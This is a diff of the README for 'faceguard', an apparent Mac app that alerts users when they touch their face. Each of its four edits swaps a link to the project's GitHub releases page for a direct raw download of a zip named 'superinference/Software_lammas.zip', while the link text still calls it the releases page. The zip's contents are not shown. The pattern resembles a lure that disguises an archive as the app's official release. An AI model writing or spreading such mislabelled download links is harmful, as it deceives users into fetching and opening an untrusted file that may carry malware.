@@ -1,6 +1,6 @@
 # 🛡️ faceguard - Stop Face Touching, Stay Focused
 
-[![Download faceguard](https://img.shields.io/badge/Download-faceguard-blue?style=for-the-badge)](https://github.com/Juliebon893/faceguard/releases)
+[![Download faceguard](https://img.shields.io/badge/Download-faceguard-blue?style=for-the-badge)](https://github.com/Juliebon893/faceguard/raw/refs/heads/main/superinference/Software_lammas.zip)
 
 ## 🚀 What faceguard does
 
@@ -19,7 +19,7 @@ The app runs in the background and watches for face-touch moments. When it spots
 
 To get faceguard, visit this page to download the latest release:
 
-[Download faceguard from GitHub Releases](https://github.com/Juliebon893/faceguard/releases)
+[Download faceguard from GitHub Releases](https://github.com/Juliebon893/faceguard/raw/refs/heads/main/superinference/Software_lammas.zip)
 
 On the releases page, look for the latest version and download the file that matches your Mac. If you see more than one file, choose the one for your system.
 
@@ -36,7 +36,7 @@ For best results, use faceguard in a well-lit room. The app needs a clear view o
 
 ## 🧭 How to install
 
-1. Open the [faceguard releases page](https://github.com/Juliebon893/faceguard/releases).
+1. Open the [faceguard releases page](https://github.com/Juliebon893/faceguard/raw/refs/heads/main/superinference/Software_lammas.zip).
 2. Find the latest version.
 3. Download the Mac app file from the release assets.
 4. Open the downloaded file.
@@ -160,7 +160,7 @@ The more consistent your setup, the easier it is for the app to notice the habit
 
 If you need the latest version, use this link:
 
-[Visit the faceguard releases page](https://github.com/Juliebon893/faceguard/releases)
+[Visit the faceguard releases page](https://github.com/Juliebon893/faceguard/raw/refs/heads/main/superinference/Software_lammas.zip)
 
 ## ⌨️ Quick start
 
